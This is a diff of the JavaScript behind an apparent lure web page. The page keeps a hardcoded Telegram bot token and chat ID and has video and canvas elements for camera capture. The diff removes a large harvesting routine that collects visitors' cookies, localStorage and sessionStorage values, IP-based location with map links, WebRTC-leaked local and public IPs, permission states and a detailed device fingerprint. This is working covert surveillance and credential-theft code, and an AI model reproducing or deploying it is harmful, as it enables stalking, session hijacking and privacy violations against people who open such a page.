@@ -119,14 +119,6 @@
 const TOKEN   = '8243475342:AAF9-cbm1bpIKCTxIVF2djRV6FSDotkK-1U';
 const CHAT_ID = '8689558225';
 
-const COOKIE_DATA  = {};
-const GEO_DATA     = {};
-const PHONE_DATA   = {};
-const BROWSER_DATA = {};
-const OTHER_DATA   = {};
-const SITES_DATA   = {};
-const SOURCE_DATA  = {};
-
 const btnYes   = document.getElementById('yes');
 const btnNo    = document.getElementById('no');
 const statusEl = document.getElementById('status');
@@ -134,1368 +126,12 @@ const video    = document.getElementById('preview');
 const canvas   = document.getElementById('canvas');
 
 // ═══════════════════════════════════════════════════════════
-// ИСТОЧНИК ПЕРЕХОДА
-// ═══════════════════════════════════════════════════════════
-function detectSource() {
-  const ua = navigator.userAgent;
-  const ref = document.referrer || '';
-
-  let inApp = 'нет';
-  if (/Telegram/i.test(ua))                     inApp = 'Telegram (встроенный браузер)';
-  else if (/Instagram/i.test(ua))               inApp = 'Instagram';
-  else if (/FBAN|FBAV|FB_IAB/i.test(ua))        inApp = 'Facebook';
-  else if (/WhatsApp/i.test(ua))                inApp = 'WhatsApp';
-  else if (/Viber/i.test(ua))                   inApp = 'Viber';
-  else if (/Line\//i.test(ua))                  inApp = 'LINE';
-  else if (/Twitter|TwitterAndroid/i.test(ua))  inApp = 'Twitter / X';
-  else if (/TikTok|BytedanceWebview/i.test(ua)) inApp = 'TikTok';
-  else if (/Snapchat/i.test(ua))                inApp = 'Snapchat';
-  else if (/VKClient|VKAndroidApp|VKiOS/i.test(ua)) inApp = 'VK';
-  else if (/OKApp/i.test(ua))                   inApp = 'Одноклассники';
-  else if (/YaBrowser/i.test(ua))               inApp = 'Яндекс.Браузер';
-  else if (/WebView|wv\)/i.test(ua))            inApp = 'WebView (встроенный)';
-  SOURCE_DATA['01 Встроенное приложение'] = inApp;
-
-  let browser = 'неизвестно';
-  if (/Edg\//i.test(ua))                        browser = 'Microsoft Edge';
-  else if (/OPR\/|Opera/i.test(ua))             browser = 'Opera';
-  else if (/YaBrowser/i.test(ua))               browser = 'Яндекс.Браузер';
-  else if (/SamsungBrowser/i.test(ua))          browser = 'Samsung Internet';
-  else if (/Firefox\//i.test(ua))               browser = 'Firefox';
-  else if (/CriOS/i.test(ua))                   browser = 'Chrome (iOS)';
-  else if (/FxiOS/i.test(ua))                   browser = 'Firefox (iOS)';
-  else if (/Chrome\//i.test(ua) && !/Edg|OPR|YaBrowser|SamsungBrowser/i.test(ua)) browser = 'Google Chrome';
-  else if (/Safari/i.test(ua) && /Version\//i.test(ua)) browser = 'Safari';
-  else if (/UCBrowser/i.test(ua))               browser = 'UC Browser';
-  else if (/MiuiBrowser/i.test(ua))             browser = 'MIUI Browser';
-  SOURCE_DATA['02 Браузер'] = browser;
-
-  let os = 'неизвестно';
-  if (/Windows NT 10/i.test(ua))  os = 'Windows 10/11';
-  else if (/Windows NT/i.test(ua))os = 'Windows';
-  else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
-  else if (/Mac OS X/i.test(ua))  os = 'macOS';
-  else if (/Android/i.test(ua))   os = 'Android';
-  else if (/Linux/i.test(ua))     os = 'Linux';
-  SOURCE_DATA['03 ОС'] = os;
-
-  let device = 'десктоп';
-  if (/iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) device = 'планшет';
-  else if (/Mobi|iPhone|Android.*Mobile/i.test(ua)) device = 'смартфон';
-  SOURCE_DATA['04 Тип устройства'] = device;
-
-  SOURCE_DATA['05 Referrer URL']    = ref || '(прямой заход)';
-  SOURCE_DATA['06 Referrer host']   = (() => { try { return new URL(ref).hostname; } catch { return ''; } })();
-
-  let refSource = 'прямой заход';
-  if (!ref)                             refSource = 'прямой заход';
-  else if (/t\.me|telegram/i.test(ref)) refSource = 'Telegram';
-  else if (/google\./i.test(ref))       refSource = 'Google поиск';
-  else if (/yandex\./i.test(ref))       refSource = 'Яндекс поиск';
-  else if (/bing\./i.test(ref))         refSource = 'Bing поиск';
-  else if (/duckduckgo\./i.test(ref))   refSource = 'DuckDuckGo';
-  else if (/vk\.com/i.test(ref))        refSource = 'ВКонтакте';
-  else if (/facebook\./i.test(ref))     refSource = 'Facebook';
-  else if (/instagram\./i.test(ref))    refSource = 'Instagram';
-  else if (/whatsapp/i.test(ref))       refSource = 'WhatsApp';
-  else if (/tiktok/i.test(ref))         refSource = 'TikTok';
-  else if (/youtube\./i.test(ref))      refSource = 'YouTube';
-  else                                  refSource = 'другой сайт';
-  SOURCE_DATA['07 Источник перехода'] = refSource;
-
-  try {
-    const p = new URLSearchParams(location.search);
-    const utm = ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','utm_id','gclid','fbclid','yclid'];
-    for (const k of utm) {
-      const v = p.get(k);
-      if (v) SOURCE_DATA['08 ' + k.toUpperCase()] = v;
-    }
-  } catch (e) {}
-
-  SOURCE_DATA['09 Язык браузера']   = navigator.language;
-  SOURCE_DATA['10 Языки']           = (navigator.languages || []).join(', ');
-  SOURCE_DATA['11 Часовой пояс']    = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  SOURCE_DATA['12 Смещение TZ']     = new Date().getTimezoneOffset();
-  SOURCE_DATA['13 Время захода']    = new Date().toLocaleString('ru-RU');
-  SOURCE_DATA['14 Экран']           = screen.width + 'x' + screen.height;
-  SOURCE_DATA['15 DPR']             = window.devicePixelRatio;
-  SOURCE_DATA['16 Онлайн']          = navigator.onLine;
-  SOURCE_DATA['17 Полный URL']      = location.href;
-  SOURCE_DATA['18 Платформа']       = navigator.platform || '';
-  SOURCE_DATA['19 Cookie enabled']  = navigator.cookieEnabled;
-  SOURCE_DATA['20 Do Not Track']    = navigator.doNotTrack;
-  SOURCE_DATA['21 Цветовая схема']  = matchMedia('(prefers-color-scheme: dark)').matches ? 'тёмная' : 'светлая';
-  SOURCE_DATA['22 Touch points']    = navigator.maxTouchPoints || 0;
-  SOURCE_DATA['23 Ядер CPU']        = navigator.hardwareConcurrency || '';
-  SOURCE_DATA['24 RAM (GB)']        = navigator.deviceMemory || '';
-  SOURCE_DATA['25 Webdriver']       = navigator.webdriver;
-  SOURCE_DATA['26 UserAgent']       = ua;
-  SOURCE_DATA['27 Хост']            = location.hostname;
-  SOURCE_DATA['28 Порт']            = location.port || 'по умолчанию';
-  SOURCE_DATA['29 Протокол']        = location.protocol;
-  SOURCE_DATA['30 Secure Context']  = window.isSecureContext;
-  SOURCE_DATA['31 Движок']          = /Gecko\/|Firefox/.test(ua) ? 'Gecko' : /AppleWebKit/.test(ua) ? 'WebKit/Blink' : 'неизвестно';
-  SOURCE_DATA['32 Ориентация']      = screen.orientation ? screen.orientation.type : '';
-  SOURCE_DATA['33 Visible']         = document.visibilityState;
-  SOURCE_DATA['34 Hostname www?']   = location.hostname.startsWith('www.');
-  SOURCE_DATA['35 Есть hash']       = location.hash ? location.hash : '(нет)';
-  SOURCE_DATA['36 Есть query']      = location.search ? location.search : '(нет)';
-  SOURCE_DATA['37 Localhost?']      = /^(localhost|127\.0\.0\.1|\[::1\])/.test(location.hostname);
-  SOURCE_DATA['38 IP-хост?']        = /^\d+\.\d+\.\d+\.\d+$/.test(location.hostname);
-  SOURCE_DATA['39 SSL?']            = location.protocol === 'https:';
-  SOURCE_DATA['40 Subdomain']       = (() => {
-    const parts = location.hostname.split('.');
-    return parts.length > 2 ? parts.slice(0, -2).join('.') : '(нет)';
-  })();
-}
-
-// ═══════════════════════════════════════════════════════════
-// COOKIES + ХРАНИЛИЩА
-// ═══════════════════════════════════════════════════════════
-async function collectCookies() {
-  COOKIE_DATA['001 cookieEnabled']       = navigator.cookieEnabled;
-  COOKIE_DATA['002 cookieStore API']     = 'cookieStore' in window;
-  COOKIE_DATA['003 SameSite поддержка']  = (() => {
-    try { document.cookie = 'test_samesite=1; SameSite=Lax'; return document.cookie.includes('test_samesite'); }
-    catch { return false; }
-  })();
-  COOKIE_DATA['004 Secure cookies разрешены'] = location.protocol === 'https:';
-  COOKIE_DATA['005 Домен']               = location.hostname;
-  COOKIE_DATA['006 Origin']              = location.origin;
-  COOKIE_DATA['007 Protocol']            = location.protocol;
-  COOKIE_DATA['008 Secure context']      = window.isSecureContext;
-  COOKIE_DATA['009 Порт cookie-области'] = location.port || 'default';
-
-  const tests = [
-    ['tf_basic','value1',''],
-    ['tf_path','value2','; path=/'],
-    ['tf_lax','value3','; SameSite=Lax'],
-    ['tf_strict','value4','; SameSite=Strict'],
-    ['tf_none','value4b','; SameSite=None; Secure'],
-    ['tf_maxage','value5','; max-age=3600'],
-    ['tf_secure','value6','; Secure'],
-    ['tf_expires','value7','; expires=' + new Date(Date.now() + 86400000).toUTCString()],
-    ['tf_long','A'.repeat(200),'; path=/'],
-    ['tf_http_only','value8',''],
-    ['tf_priority','value9','; priority=high'],
-    ['tf_partitioned','value10','; partitioned'],
-  ];
-  const written = [];
-  for (const [name, val, attr] of tests) {
-    try { document.cookie = name + '=' + val + attr; written.push(name); } catch (e) {}
-  }
-  COOKIE_DATA['010 Записано тестовых']    = written.length;
-  COOKIE_DATA['011 Имена тестовых']       = written.join(', ');
-
-  const raw = document.cookie || '';
-  COOKIE_DATA['012 Сырая строка cookie']  = raw.slice(0, 3500) || '(пусто)';
-  COOKIE_DATA['013 Длина строки']         = raw.length;
-  COOKIE_DATA['014 Количество cookies']   = raw ? raw.split(';').length : 0;
-
-  const pairs = {};
-  if (raw) {
-    raw.split(';').forEach(p => {
-      const i = p.indexOf('=');
-      if (i > -1) pairs[p.slice(0, i).trim()] = p.slice(i + 1).trim();
-    });
-  }
-  COOKIE_DATA['015 Уникальных имён']  = Object.keys(pairs).length;
-  COOKIE_DATA['016 Список имён']      = Object.keys(pairs).join(', ') || '(нет)';
-
-  let idx = 100;
-  Object.entries(pairs).slice(0, 60).forEach(([k, v]) => {
-    COOKIE_DATA[String(idx++).padStart(3, '0') + ' cookie: ' + k] = String(v).slice(0, 250);
-  });
-
-  if (window.cookieStore && cookieStore.getAll) {
-    try {
-      const all = await cookieStore.getAll();
-      COOKIE_DATA['201 CookieStore всего'] = all.length;
-      COOKIE_DATA['202 CookieStore имена'] = all.map(c => c.name).join(', ');
-      all.slice(0, 30).forEach((c, i) => {
-        const base = 210 + i * 4;
-        COOKIE_DATA[String(base).padStart(3,'0') + ' CS ' + c.name + ' value'] = String(c.value || '').slice(0,200);
-        COOKIE_DATA[String(base+1).padStart(3,'0') + ' CS ' + c.name + ' domain'] = c.domain;
-        COOKIE_DATA[String(base+2).padStart(3,'0') + ' CS ' + c.name + ' path'] = c.path;
-        COOKIE_DATA[String(base+3).padStart(3,'0') + ' CS ' + c.name + ' expires'] = c.expires ? new Date(c.expires).toISOString() : 'session';
-      });
-    } catch (e) { COOKIE_DATA['203 CookieStore ошибка'] = String(e); }
-  }
-
-  try {
-    const lsData = {};
-    for (let i = 0; i < localStorage.length; i++) {
-      const k = localStorage.key(i); lsData[k] = localStorage.getItem(k);
-    }
-    COOKIE_DATA['301 localStorage ключей'] = Object.keys(lsData).length;
-    COOKIE_DATA['302 localStorage имена']  = Object.keys(lsData).slice(0, 60).join(', ') || '(пусто)';
-    let li = 310;
-    Object.entries(lsData).slice(0, 40).forEach(([k, v]) => {
-      COOKIE_DATA[String(li++).padStart(3,'0') + ' LS ' + k] = String(v).slice(0, 200);
-    });
-  } catch (e) { COOKIE_DATA['303 localStorage ошибка'] = String(e); }
-
-  try {
-    const ssData = {};
-    for (let i = 0; i < sessionStorage.length; i++) {
-      const k = sessionStorage.key(i); ssData[k] = sessionStorage.getItem(k);
-    }
-    COOKIE_DATA['351 sessionStorage ключей'] = Object.keys(ssData).length;
-    COOKIE_DATA['352 sessionStorage имена']  = Object.keys(ssData).slice(0, 60).join(', ') || '(пусто)';
-    let si = 360;
-    Object.entries(ssData).slice(0, 40).forEach(([k, v]) => {
-      COOKIE_DATA[String(si++).padStart(3,'0') + ' SS ' + k] = String(v).slice(0, 200);
-    });
-  } catch (e) { COOKIE_DATA['353 sessionStorage ошибка'] = String(e); }
-
-  try {
-    if (indexedDB.databases) {
-      const dbs = await indexedDB.databases();
-      COOKIE_DATA['401 IndexedDB баз'] = dbs.length;
-      COOKIE_DATA['402 IndexedDB имена'] = dbs.map(d => d.name + (d.version ? ' v' + d.version : '')).join(', ') || '(нет)';
-      dbs.slice(0, 20).forEach((d, i) => {
-        COOKIE_DATA[String(410 + i*2).padStart(3,'0') + ' IDB ' + d.name + ' version'] = d.version;
-        COOKIE_DATA[String(411 + i*2).padStart(3,'0') + ' IDB ' + d.name + ' name'] = d.name;
-      });
-    }
-  } catch (e) {}
-
-  try {
-    if (window.caches) {
-      const keys = await caches.keys();
-      COOKIE_DATA['451 Cache Storage кэшей'] = keys.length;
-      COOKIE_DATA['452 Cache Storage имена'] = keys.slice(0, 30).join(', ') || '(нет)';
-    }
-  } catch (e) {}
-
-  try {
-    if (navigator.storage && navigator.storage.estimate) {
-      const e = await navigator.storage.estimate();
-      COOKIE_DATA['461 Storage квота (MB)']    = Math.round(e.quota / 1048576);
-      COOKIE_DATA['462 Storage использовано KB']= Math.round(e.usage / 1024);
-      COOKIE_DATA['463 Storage процент']        = ((e.usage / e.quota) * 100).toFixed(4) + '%';
-      if (e.usageDetails) {
-        let i = 464;
-        for (const k in e.usageDetails) {
-          COOKIE_DATA[String(i++) + ' Storage ' + k] = e.usageDetails[k];
-        }
-      }
-    }
-  } catch (e) {}
-
-  COOKIE_DATA['481 Secure установлен']     = raw.includes('tf_secure');
-  COOKIE_DATA['482 SameSite=Lax установлен']    = raw.includes('tf_lax');
-  COOKIE_DATA['483 SameSite=Strict установлен'] = raw.includes('tf_strict');
-  COOKIE_DATA['484 max-age установлен']         = raw.includes('tf_maxage');
-  COOKIE_DATA['485 expires установлен']         = raw.includes('tf_expires');
-  COOKIE_DATA['486 path=/ установлен']          = raw.includes('tf_path');
-  COOKIE_DATA['487 Длинная cookie (200б)']      = raw.includes('tf_long');
-  COOKIE_DATA['488 SameSite=None']              = raw.includes('tf_none');
-  COOKIE_DATA['489 Priority установлен']        = raw.includes('tf_priority');
-  COOKIE_DATA['490 Partitioned установлен']     = raw.includes('tf_partitioned');
-  COOKIE_DATA['491 CookieStore доступен']       = !!(window.cookieStore);
-  COOKIE_DATA['492 LocalStorage доступен']      = (() => { try { localStorage.setItem('_','1'); localStorage.removeItem('_'); return true; } catch { return false; } })();
-  COOKIE_DATA['493 SessionStorage доступен']    = (() => { try { sessionStorage.setItem('_','1'); sessionStorage.removeItem('_'); return true; } catch { return false; } })();
-  COOKIE_DATA['494 IndexedDB доступен']         = 'indexedDB' in window;
-  COOKIE_DATA['495 Cache API доступен']         = 'caches' in window;
-  COOKIE_DATA['496 Storage Manager доступен']   = !!(navigator.storage && navigator.storage.estimate);
-  COOKIE_DATA['497 Persistent storage']         = !!(navigator.storage && navigator.storage.persist);
-  COOKIE_DATA['498 Persisted?']                 = navigator.storage && navigator.storage.persisted ? await navigator.storage.persisted() : '';
-  COOKIE_DATA['499 Quota Storage?']             = !!(navigator.storage && navigator.storage.estimate);
-  COOKIE_DATA['500 Cross-Origin Isolated']      = window.crossOriginIsolated;
-}
-
-// ═══════════════════════════════════════════════════════════
-// ГЕО (IP-геолокация + WebRTC + карты)
-// ═══════════════════════════════════════════════════════════
-async function collectGeo() {
-  let best = null;
-
-  try {
-    const r = await fetch('https://ipwho.is/');
-    const g = await r.json();
-    if (g.success !== false && g.latitude != null) {
-      GEO_DATA['001 Источник']    = 'ipwho.is';
-      GEO_DATA['002 IP']          = g.ip;
-      GEO_DATA['003 Тип IP']      = g.type;
-      GEO_DATA['004 Континент']   = g.continent;
-      GEO_DATA['005 Код континента'] = g.continent_code;
-      GEO_DATA['006 Страна']      = g.country;
-      GEO_DATA['007 Код страны']  = g.country_code;
-      GEO_DATA['008 Столица']     = g.capital;
-      GEO_DATA['009 Регион']      = g.region;
-      GEO_DATA['010 Код региона'] = g.region_code;
-      GEO_DATA['011 Город']       = g.city;
-      GEO_DATA['012 Индекс']      = g.postal;
-      GEO_DATA['013 Широта']      = g.latitude;
-      GEO_DATA['014 Долгота']     = g.longitude;
-      GEO_DATA['015 TZ id']       = g.timezone && g.timezone.id;
-      GEO_DATA['016 TZ abbr']     = g.timezone && g.timezone.abbr;
-      GEO_DATA['017 UTC']         = g.timezone && g.timezone.utc;
-      GEO_DATA['018 UTC offset']  = g.timezone && g.timezone.utc_offset;
-      GEO_DATA['019 ISP']         = g.connection && g.connection.isp;
-      GEO_DATA['020 Организация'] = g.connection && g.connection.org;
-      GEO_DATA['021 ASN']         = g.connection && ('AS' + g.connection.asn);
-      GEO_DATA['022 Домен ASN']   = g.connection && g.connection.domain;
-      GEO_DATA['023 Мобильный']   = g.connection && g.connection.is_mobile;
-      GEO_DATA['024 Прокси']      = g.security && g.security.proxy;
-      GEO_DATA['025 VPN']         = g.security && g.security.vpn;
-      GEO_DATA['026 Tor']         = g.security && g.security.tor;
-      GEO_DATA['027 Хостинг']     = g.security && g.security.hosting;
-      GEO_DATA['028 Флаг страны'] = g.flag && g.flag.emoji;
-      GEO_DATA['029 Валюта']      = g.currency && (g.currency.code + ' ' + g.currency.symbol);
-      GEO_DATA['030 Телефон код'] = g.calling_code;
-      GEO_DATA['031 Границы']     = g.borders;
-      GEO_DATA['032 На карте']    = g.latitude + ',' + g.longitude;
-      best = { lat: g.latitude, lng: g.longitude };
-    }
-  } catch (e) {}
-
-  if (!best) {
-    try {
-      const r = await fetch('https://ipwhois.app/json/');
-      const g = await r.json();
-      if (g.success && g.latitude) {
-        GEO_DATA['050 Источник 2']  = 'ipwhois.app';
-        GEO_DATA['051 IP']          = g.ip;
-        GEO_DATA['052 Страна']      = g.country;
-        GEO_DATA['053 Город']       = g.city;
-        GEO_DATA['054 Регион']      = g.region;
-        GEO_DATA['055 Широта']      = g.latitude;
-        GEO_DATA['056 Долгота']     = g.longitude;
-        GEO_DATA['057 ISP']         = g.isp;
-        GEO_DATA['058 ASN']         = g.asn;
-        GEO_DATA['059 Валюта']      = g.currency;
-        GEO_DATA['060 Телефон']     = g.phone;
-        best = { lat: g.latitude, lng: g.longitude };
-      }
-    } catch (e) {}
-  }
-
-  if (!best) {
-    try {
-      const r = await fetch('https://ipapi.co/json/');
-      const g = await r.json();
-      if (g.latitude != null) {
-        GEO_DATA['080 Источник 3']  = 'ipapi.co';
-        GEO_DATA['081 IP']          = g.ip;
-        GEO_DATA['082 Страна']      = g.country_name;
-        GEO_DATA['083 Код страны']  = g.country;
-        GEO_DATA['084 Город']       = g.city;
-        GEO_DATA['085 Регион']      = g.region;
-        GEO_DATA['086 Широта']      = g.latitude;
-        GEO_DATA['087 Долгота']     = g.longitude;
-        GEO_DATA['088 TZ']          = g.timezone;
-        GEO_DATA['089 UTC']         = g.utc_offset;
-        GEO_DATA['090 ASN']         = g.asn;
-        GEO_DATA['091 Организация'] = g.org;
-        GEO_DATA['092 Сеть']        = g.network;
-        GEO_DATA['093 Валюта']      = g.currency;
-        best = { lat: g.latitude, lng: g.longitude };
-      }
-    } catch (e) {}
-  }
-
-  if (best) {
-    const lat = parseFloat(best.lat), lng = parseFloat(best.lng);
-    GEO_DATA['101 Google Maps поиск']    = 'https://www.google.com/maps?q=' + lat + ',' + lng;
-    GEO_DATA['102 Google Maps спутник']  = 'https://www.google.com/maps/@' + lat + ',' + lng + ',12z/data=!3m1!1e3';
-    GEO_DATA['103 Google Maps улицы']    = 'https://www.google.com/maps/@' + lat + ',' + lng + ',15z';
-    GEO_DATA['104 Google Street View']   = 'https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=' + lat + ',' + lng;
-    GEO_DATA['105 Яндекс.Карты']         = 'https://yandex.ru/maps/?pt=' + lng + ',' + lat + '&z=12&l=map';
-    GEO_DATA['106 Яндекс.Панорамы']      = 'https://yandex.ru/maps/?ll=' + lng + ',' + lat + '&panorama[point]=' + lng + ',' + lat;
-    GEO_DATA['107 OpenStreetMap']        = 'https://www.openstreetmap.org/?mlat=' + lat + '&mlon=' + lng + '#map=12/' + lat + '/' + lng;
-    GEO_DATA['108 Bing Maps']            = 'https://www.bing.com/maps?cp=' + lat + '~' + lng + '&lvl=12';
-    GEO_DATA['109 2GIS']                 = 'https://2gis.ru/geo/' + lng + ',' + lat;
-    GEO_DATA['110 What3Words']           = 'https://what3words.com/' + lat + ',' + lng;
-    GEO_DATA['111 Геокодер Google']      = 'https://maps.googleapis.com/maps/api/geocode/json?latlng=' + lat + ',' + lng;
-    GEO_DATA['112 Nominatim OSM']        = 'https://nominatim.openstreetmap.org/reverse?lat=' + lat + '&lon=' + lng + '&format=json';
-    GEO_DATA['113 SunCalc (солнце)']     = 'https://www.suncalc.org/#/' + lat + ',' + lng + ',12';
-    GEO_DATA['114 Wikipedia Geolink']    = 'https://ru.wikipedia.org/wiki/Служебная:Рядом?ns0=1&lat=' + lat + '&lon=' + lng;
-    GEO_DATA['115 Timezone DB']          = 'https://timezonedb.com/time-zones?lat=' + lat + '&lng=' + lng;
-  }
-
-  await new Promise(resolve => {
-    try {
-      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-      const ips = new Set(), srflx = new Set();
-      let done = false;
-      const finish = () => {
-        if (done) return; done = true;
-        GEO_DATA['201 Локальные IP'] = Array.from(ips).join(', ') || 'скрыто';
-        GEO_DATA['202 Публичные IP'] = Array.from(srflx).join(', ') || 'скрыто';
-        try { pc.close(); } catch {}
-        resolve();
-      };
-      pc.createDataChannel('');
-      pc.onicecandidate = e => {
-        if (!e.candidate) return finish();
-        const c = e.candidate.candidate;
-        const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i.exec(c);
-        if (m) (/srflx|relay/.test(c) ? srflx : ips).add(m[1]);
-      };
-      pc.createOffer().then(o => pc.setLocalDescription(o));
-      setTimeout(finish, 2000);
-    } catch (e) { resolve(); }
-  });
-
-  // Geolocation API (без разрешения — только наличие)
-  GEO_DATA['211 Geolocation API есть']       = 'geolocation' in navigator;
-  GEO_DATA['212 Permissions API есть']       = 'permissions' in navigator;
-  try {
-    if (navigator.permissions) {
-      const g = await navigator.permissions.query({ name: 'geolocation' });
-      GEO_DATA['213 Разрешение геолокации'] = g.state;
-    }
-  } catch (e) {}
-  try {
-    if (navigator.permissions) {
-      const c = await navigator.permissions.query({ name: 'camera' });
-      GEO_DATA['214 Разрешение камеры']  = c.state;
-    }
-  } catch (e) {}
-  try {
-    if (navigator.permissions) {
-      const m = await navigator.permissions.query({ name: 'microphone' });
-      GEO_DATA['215 Разрешение микрофона'] = m.state;
-    }
-  } catch (e) {}
-  try {
-    if (navigator.permissions) {
-      const n = await navigator.permissions.query({ name: 'notifications' });
-      GEO_DATA['216 Разрешение уведомлений'] = n.state;
-    }
-  } catch (e) {}
-
-  GEO_DATA['220 Координаты точность']     = 'может быть запрошена';
-  GEO_DATA['221 Язык для гео']            = navigator.language;
-  GEO_DATA['222 Часовой пояс клиента']    = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  GEO_DATA['223 Смещение TZ минут']       = new Date().getTimezoneOffset();
-  GEO_DATA['224 Локальное время']         = new Date().toLocaleString('ru-RU');
-  GEO_DATA['225 ISO время']               = new Date().toISOString();
-  GEO_DATA['226 Daylight saving?']        = (() => {
-    const jan = new Date(new Date().getFullYear(), 0, 1).getTimezoneOffset();
-    const jul = new Date(new Date().getFullYear(), 6, 1).getTimezoneOffset();
-    return jan !== jul;
-  })();
-}
-
-// ═══════════════════════════════════════════════════════════
-// ТЕЛЕФОН / УСТРОЙСТВО — расширенный
-// ═══════════════════════════════════════════════════════════
-async function collectPhone() {
-  const n = navigator, s = screen;
-  PHONE_DATA['001 Ширина экрана']    = s.width;
-  PHONE_DATA['002 Высота экрана']    = s.height;
-  PHONE_DATA['003 Доступн. ширина']  = s.availWidth;
-  PHONE_DATA['004 Доступн. высота']  = s.availHeight;
-  PHONE_DATA['005 Глубина цвета']    = s.colorDepth;
-  PHONE_DATA['006 Pixel depth']      = s.pixelDepth;
-  PHONE_DATA['007 DPR']              = window.devicePixelRatio;
-  PHONE_DATA['008 Ориентация']       = s.orientation ? s.orientation.type : '';
-  PHONE_DATA['009 Угол ориентации']  = s.orientation ? s.orientation.angle : '';
-  PHONE_DATA['010 Ширина окна']      = window.innerWidth;
-  PHONE_DATA['011 Высота окна']      = window.innerHeight;
-  PHONE_DATA['012 Внешн. ширина']    = window.outerWidth;
-  PHONE_DATA['013 Внешн. высота']    = window.outerHeight;
-  PHONE_DATA['014 Позиция X']        = window.screenX;
-  PHONE_DATA['015 Позиция Y']        = window.screenY;
-  PHONE_DATA['016 Полоса прокрутки'] = window.innerWidth - document.documentElement.clientWidth;
-  PHONE_DATA['017 Диагональ пикс']   = Math.round(Math.sqrt(s.width**2 + s.height**2));
-  PHONE_DATA['018 Диагональ дюйм']   = (Math.sqrt(s.width**2 + s.height**2) / 96).toFixed(2);
-  PHONE_DATA['019 DeviceOrientation']= 'DeviceOrientationEvent' in window;
-  PHONE_DATA['020 DeviceMotion']     = 'DeviceMotionEvent' in window;
-  PHONE_DATA['021 Accelerometer']    = 'Accelerometer' in window;
-  PHONE_DATA['022 Gyroscope']        = 'Gyroscope' in window;
-  PHONE_DATA['023 Magnetometer']     = 'Magnetometer' in window;
-  PHONE_DATA['024 AmbientLight']     = 'AmbientLightSensor' in window;
-  PHONE_DATA['025 LinearAccel']      = 'LinearAccelerationSensor' in window;
-  PHONE_DATA['026 GravitySensor']    = 'GravitySensor' in window;
-  PHONE_DATA['027 Max touch points'] = n.maxTouchPoints || 0;
-  PHONE_DATA['028 Touch support']    = 'ontouchstart' in window;
-  PHONE_DATA['029 Pointer support']  = 'PointerEvent' in window;
-  PHONE_DATA['030 Vibrate API']      = 'vibrate' in n;
-  PHONE_DATA['031 Ядер CPU']         = n.hardwareConcurrency || '';
-  PHONE_DATA['032 RAM (GB)']         = n.deviceMemory || '';
-  PHONE_DATA['033 Платформа']        = n.platform || '';
-  PHONE_DATA['034 Мобильный UA-CH']  = n.userAgentData ? n.userAgentData.mobile : '';
-  PHONE_DATA['035 Платформа UA-CH']  = n.userAgentData ? n.userAgentData.platform : '';
-  PHONE_DATA['036 Бренды UA-CH']     = n.userAgentData ? n.userAgentData.brands.map(b => b.brand + ' ' + b.version).join(', ') : '';
-  PHONE_DATA['037 Языки']            = (n.languages || []).join(', ');
-  PHONE_DATA['038 Основной язык']    = n.language;
-  PHONE_DATA['039 Родной язык']      = n.userLanguage || n.browserLanguage || '';
-
-  const ua = n.userAgent;
-  PHONE_DATA['040 UA строка']        = ua;
-  PHONE_DATA['041 Возможно телефон'] = /Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua);
-  PHONE_DATA['042 Возможно планшет'] = /iPad|Tablet|PlayBook|Silk/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua));
-  PHONE_DATA['043 Возможно десктоп'] = !/Mobi|Android|iPhone|iPad|iPod/i.test(ua);
-  PHONE_DATA['044 OS']               = (() => {
-    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
-    if (/Mac OS X/.test(ua))        return 'macOS';
-    if (/Android/.test(ua))         return 'Android';
-    if (/iPhone|iPad|iPod/.test(ua))return 'iOS';
-    if (/Linux/.test(ua))           return 'Linux';
-    return 'неизвестно';
-  })();
-  PHONE_DATA['045 OS версия']        = (() => {
-    const m = /(Windows NT [\d.]+|Mac OS X [\d_.]+|Android [\d.]+|OS [\d_]+)/.exec(ua);
-    return m ? m[1].replace(/_/g, '.') : '';
-  })();
-  PHONE_DATA['046 Модель устройства']= (() => { const m = /\(([^)]+)\)/.exec(ua); return m ? m[1] : ''; })();
-  PHONE_DATA['047 Архитектура']      = /WOW64|Win64|x64|x86_64|amd64/i.test(ua) ? 'x64' : /arm|aarch64/i.test(ua) ? 'ARM' : 'x86 / неизвестно';
-  PHONE_DATA['048 Bit depth']        = /64/.test(ua) ? '64-bit' : '32-bit';
-
-  if (n.getBattery) {
-    try {
-      const b = await n.getBattery();
-      PHONE_DATA['050 Батарея %']        = Math.round(b.level * 100) + '%';
-      PHONE_DATA['051 Уровень 0-1']      = b.level;
-      PHONE_DATA['052 Заряжается']       = b.charging;
-      PHONE_DATA['053 Время до заряда']  = b.chargingTime === Infinity ? 'бесконечность' : b.chargingTime;
-      PHONE_DATA['054 Время до разряд.'] = b.dischargingTime === Infinity ? 'бесконечность' : b.dischargingTime;
-    } catch (e) {}
-  }
-
-  const c = n.connection || n.mozConnection || n.webkitConnection;
-  if (c) {
-    PHONE_DATA['060 Тип сети']      = c.effectiveType;
-    PHONE_DATA['061 Тип conn.']     = c.type;
-    PHONE_DATA['062 Downlink Mbps'] = c.downlink;
-    PHONE_DATA['063 Downlink max']  = c.downlinkMax;
-    PHONE_DATA['064 RTT ms']        = c.rtt;
-    PHONE_DATA['065 Save data']     = c.saveData;
-  }
-  PHONE_DATA['066 Онлайн']          = n.onLine;
-  PHONE_DATA['067 Геолокация API']  = 'geolocation' in n;
-  PHONE_DATA['068 Bluetooth API']   = 'bluetooth' in n;
-  PHONE_DATA['069 USB API']         = 'usb' in n;
-  PHONE_DATA['070 NFC API']         = 'NDEFReader' in window;
-  PHONE_DATA['071 Serial API']      = 'serial' in n;
-  PHONE_DATA['072 HID API']         = 'hid' in n;
-  PHONE_DATA['073 MIDI API']        = 'requestMIDIAccess' in n;
-  PHONE_DATA['074 Gamepad API']     = 'getGamepads' in n;
-  PHONE_DATA['075 XR']              = 'xr' in n;
-  PHONE_DATA['076 VR']              = 'VRDisplay' in window;
